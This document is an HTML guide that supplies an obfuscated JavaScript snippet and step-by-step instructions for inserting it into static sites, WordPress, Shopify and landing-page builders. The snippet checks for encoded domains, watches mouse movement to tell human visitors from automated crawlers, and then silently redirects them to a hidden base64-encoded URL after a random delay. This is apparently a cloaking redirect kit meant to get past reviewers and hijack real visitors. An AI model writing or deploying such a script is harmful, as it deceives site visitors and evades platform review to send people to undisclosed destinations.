<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Code Placement Guide</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            max-width: 1000px;
            margin: 0 auto;
            padding: 20px;
            background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
            color: white;
            min-height: 100vh;
        }
        .container {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(15px);
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.4);
        }
        .placement-option {
            background: rgba(255,255,255,0.05);
            padding: 20px;
            margin: 20px 0;
            border-radius: 10px;
            border-left: 4px solid #4CAF50;
        }
        .code-block {
            background: rgba(0,0,0,0.4);
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            overflow-x: auto;
            margin: 10px 0;
            white-space: pre-wrap;
        }
        .highlight {
            background: rgba(255, 193, 7, 0.8);
            color: black;
            padding: 2px 4px;
            border-radius: 3px;
            font-weight: bold;
        }
        .warning {
            background: rgba(255, 87, 34, 0.3);
            border-left: 4px solid #FF5722;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
        }
        .success {
            background: rgba(76, 175, 80, 0.3);
            border-left: 4px solid #4CAF50;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
        }
        .method {
            background: rgba(33, 150, 243, 0.2);
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
        }
        .step {
            background: rgba(255,255,255,0.1);
            padding: 15px;
            margin: 10px 0;
            border-radius: 8px;
        }
        h3 {
            color: #4ECDC4;
        }
        .platform {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin: 20px 0;
        }
        .platform-card {
            background: rgba(255,255,255,0.05);
            padding: 15px;
            border-radius: 8px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üìç Where to Add Your Code</h1>
        
        <div class="success">
            <h2>‚úÖ RECOMMENDED: Before Closing &lt;/body&gt; Tag</h2>
            <p>This is the BEST location because it ensures the page loads first, then your script runs.</p>
        </div>

        <div class="placement-option">
            <h2>üéØ HTML Structure Example:</h2>
            <div class="code-block">
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Your Page Title&lt;/title&gt;
    &lt;!-- Other head content --&gt;
&lt;/head&gt;
&lt;body&gt;
    
    &lt;!-- Your page content here --&gt;
    &lt;h1&gt;Welcome to My Site&lt;/h1&gt;
    &lt;p&gt;Your regular content...&lt;/p&gt;
    
    &lt;!-- üéØ ADD YOUR CODE HERE (before closing body tag) --&gt;
    <span class="highlight">&lt;script&gt;
    !function(){const $=atob,_=Math,d=document,w=window,l=location,a=['YOUR_ENCODED_DOMAIN1','YOUR_ENCODED_DOMAIN2'];if(!a.map($).includes(l.hostname))return;let m=[],t=0;d.addEventListener('mousemove',e=&gt;{if(t)return;m.push([e.clientX,e.clientY]);if(m.length&gt;=4){t=1;let s=0,c=0;for(let i=1;i&lt;m.length;i++){let x=m[i][0]-m[i-1][0],y=m[i][1]-m[i-1][1];s+=_.sqrt(x*x+y*y);if(i&gt;1&amp;&amp;_.abs(_.atan2(y,x)-_.atan2(m[i-1][1]-m[i-2][1],m[i-1][0]-m[i-2][0]))&gt;0.3)c++;}if(s&gt;100&amp;&amp;c&gt;=1)setTimeout(()=&gt;w.location.replace($('YOUR_ENCODED_TARGET_URL')),_.random()*1000+500);}},{passive:1});}();
    &lt;/script&gt;</span>
    
&lt;/body&gt;
&lt;/html&gt;
            </div>
        </div>

        <h2>üåê Platform-Specific Instructions:</h2>
        
        <div class="platform">
            <div class="platform-card">
                <h3>üìÑ Static HTML Sites</h3>
                <p>Edit your HTML file directly</p>
            </div>
            <div class="platform-card">
                <h3>üìù WordPress</h3>
                <p>Theme editor or plugin</p>
            </div>
            <div class="platform-card">
                <h3>üõí Shopify</h3>
                <p>Theme customization</p>
            </div>
            <div class="platform-card">
                <h3>‚ö° Landing Pages</h3>
                <p>Custom code section</p>
            </div>
        </div>

        <div class="method">
            <h3>üìÑ Method 1: Static HTML Website</h3>
            <div class="step">
                <strong>Step 1:</strong> Open your HTML file in a text editor
            </div>
            <div class="step">
                <strong>Step 2:</strong> Find the closing <code>&lt;/body&gt;</code> tag
            </div>
            <div class="step">
                <strong>Step 3:</strong> Paste your code just BEFORE the <code>&lt;/body&gt;</code> tag
            </div>
            <div class="step">
                <strong>Step 4:</strong> Save the file and upload to your server
            </div>
        </div>

        <div class="method">
            <h3>üìù Method 2: WordPress</h3>
            
            <h4>Option A: Theme Editor</h4>
            <div class="step">
                <strong>Step 1:</strong> WordPress Admin ‚Üí Appearance ‚Üí Theme Editor
            </div>
            <div class="step">
                <strong>Step 2:</strong> Open <code>footer.php</code> or <code>index.php</code>
            </div>
            <div class="step">
                <strong>Step 3:</strong> Find <code>&lt;?php wp_footer(); ?&gt;</code>
            </div>
            <div class="step">
                <strong>Step 4:</strong> Add your script AFTER that line, BEFORE <code>&lt;/body&gt;</code>
            </div>
            
            <div class="code-block">
&lt;?php wp_footer(); ?&gt;

<span class="highlight">&lt;script&gt;
// Your code here
&lt;/script&gt;</span>

&lt;/body&gt;
&lt;/html&gt;
            </div>

            <h4>Option B: Plugin Method</h4>
            <div class="step">
                <strong>Step 1:</strong> Install "Insert Headers and Footers" plugin
            </div>
            <div class="step">
                <strong>Step 2:</strong> Go to Settings ‚Üí Insert Headers and Footers
            </div>
            <div class="step">
                <strong>Step 3:</strong> Paste your code in "Scripts in Footer" section
            </div>
        </div>

        <div class="method">
            <h3>üõí Method 3: Shopify</h3>
            <div class="step">
                <strong>Step 1:</strong> Shopify Admin ‚Üí Online Store ‚Üí Themes
            </div>
            <div class="step">
                <strong>Step 2:</strong> Click "Actions" ‚Üí "Edit Code"
            </div>
            <div class="step">
                <strong>Step 3:</strong> Open <code>theme.liquid</code> file
            </div>
            <div class="step">
                <strong>Step 4:</strong> Find <code>&lt;/body&gt;</code> tag
            </div>
            <div class="step">
                <strong>Step 5:</strong> Paste your code just BEFORE <code>&lt;/body&gt;</code>
            </div>
        </div>

        <div class="method">
            <h3>‚ö° Method 4: Landing Page Builders</h3>
            
            <div class="platform">
                <div class="platform-card">
                    <h4>Unbounce</h4>
                    <p>Page Settings ‚Üí Custom JavaScript</p>
                </div>
                <div class="platform-card">
                    <h4>ClickFunnels</h4>
                    <p>Settings ‚Üí Tracking Code ‚Üí Footer</p>
                </div>
                <div class="platform-card">
                    <h4>Leadpages</h4>
                    <p>Page Settings ‚Üí Advanced ‚Üí Footer Code</p>
                </div>
                <div class="platform-card">
                    <h4>Instapage</h4>
                    <p>Publish ‚Üí Tracking & Analytics ‚Üí Custom Code</p>
                </div>
            </div>
        </div>

        <div class="warning">
            <h3>‚ö†Ô∏è Important Notes:</h3>
            <ul>
                <li><strong>Don't add to &lt;head&gt;</strong> - It won't work properly</li>
                <li><strong>Always wrap in &lt;script&gt; tags</strong> - Required for JavaScript</li>
                <li><strong>Test after adding</strong> - Make sure it works</li>
                <li><strong>Keep a backup</strong> - Save original files first</li>
            </ul>
        </div>

        <div class="success">
            <h3>‚úÖ How to Test if It's Working:</h3>
            <div class="step">
                <strong>Step 1:</strong> Visit your website
            </div>
            <div class="step">
                <strong>Step 2:</strong> Move your mouse around (4-5 movements)
            </div>
            <div class="step">
                <strong>Step 3:</strong> You should get redirected within 1-2 seconds
            </div>
            <div class="step">
                <strong>Step 4:</strong> If nothing happens, check browser console (F12) for errors
            </div>
        </div>

        <div class="method">
            <h3>üîß Troubleshooting:</h3>
            <div class="step">
                <strong>Not working?</strong> Check if your domain encoding is correct
            </div>
            <div class="step">
                <strong>Console errors?</strong> Make sure the script is properly wrapped in &lt;script&gt; tags
            </div>
            <div class="step">
                <strong>Still issues?</strong> Try adding to a simple HTML test page first
            </div>
        </div>

    </div>
</body>
</html>
